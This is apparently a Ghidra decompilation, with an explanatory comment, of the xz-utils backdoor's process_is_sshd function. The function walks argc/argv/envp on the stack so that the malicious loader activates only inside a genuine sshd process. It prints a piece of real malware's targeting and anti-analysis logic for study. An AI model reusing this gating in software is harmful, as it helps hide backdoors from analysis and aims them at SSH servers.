// /home/kali/xzre-ghidra/xzregh/103A20_process_is_sshd.c
// Function: process_is_sshd @ 0x103A20
// Calling convention: __stdcall
// Prototype: BOOL __stdcall process_is_sshd(elf_info_t * elf, u8 * stack_end)


/*
 * AutoDoc: Replays sshd's argc/argv/envp layout straight off the stack pointer: it checks that argc is sane, argv[0] points above
 * the stack and hashes to `/usr/sbin/sshd`, and every subsequent argv entry lives within 0x4000 bytes of the saved SP.
 * Each argument is passed through `check_argument`, and once it reaches envp it enforces that every pointer is either
 * stack-resident or located inside sshd's .data segment. Any environment string that matches a known identifier (via
 * `get_string_id`) or falls outside those regions terminates the probe so the loader only runs inside real sshd processes.
 */

#include "xzre_types.h"

BOOL process_is_sshd(elf_info_t *elf,u8 *stack_end)

{
  long lVar1;
  u8 *puVar2;
  EncodedStringId EVar3;
  char *pcVar4;
  u8 *puVar5;
  long lVar6;
  ulong *puVar7;
  BOOL more_args_to_scan;
  u8 *data_segment;
  ulong *envp;
  long argc;
  u8 *argv0;
  
  if (((((&stack0xfffffffffffffff8 < stack_end) &&
        ((ulong)((long)stack_end - (long)&stack0xfffffffffffffff8) < 0x2001)) &&
       (lVar1 = *(long *)stack_end, lVar1 - 1U < 0x20)) &&
      ((puVar2 = *(u8 **)(stack_end + 8), stack_end < puVar2 && (puVar2 != (u8 *)0x0)))) &&
     ((ulong)((long)puVar2 - (long)stack_end) < 0x4001)) {
    EVar3 = get_string_id((char *)puVar2,(char *)0x0);
    lVar6 = 1;
    if (EVar3 == STR_usr_sbin_sshd) {
      while (more_args_to_scan = lVar6 != lVar1, lVar6 = lVar6 + 1, more_args_to_scan) {
        puVar2 = *(u8 **)(stack_end + lVar6 * 8);
        if (puVar2 <= stack_end) {
          return FALSE;
        }
        if (puVar2 == (u8 *)0x0) {
          return FALSE;
        }
        if (0x4000 < (ulong)((long)puVar2 - (long)stack_end)) {
          return FALSE;
        }
        pcVar4 = check_argument((char)*(undefined2 *)puVar2,(char *)puVar2);
        if (pcVar4 != (char *)0x0) {
          return FALSE;
        }
      }
      if (*(long *)(stack_end + lVar6 * 8) == 0) {
        puVar7 = (ulong *)(stack_end + lVar6 * 8 + 8);
        do {
          puVar2 = (u8 *)*puVar7;
          if (puVar2 == (u8 *)0x0) {
            return FALSE;
          }
          if ((puVar2 <= stack_end) || (0x4000 < (ulong)((long)puVar2 - (long)stack_end))) {
            argv0 = (u8 *)0x0;
            puVar5 = (u8 *)elf_get_data_segment(elf,(u64 *)&argv0,TRUE);
            if (puVar5 == (u8 *)0x0) {
              return FALSE;
            }
            if (argv0 + (long)puVar5 < puVar2 + 0x2c) {
              return FALSE;
            }
            if (puVar2 < puVar5) {
              return FALSE;
            }
          }
          EVar3 = get_string_id((char *)*puVar7,(char *)0x0);
          if (EVar3 != 0) {
            return FALSE;
          }
          puVar7 = puVar7 + 1;
        } while (*puVar7 != 0);
        return TRUE;
      }
    }
  }
  return FALSE;
}

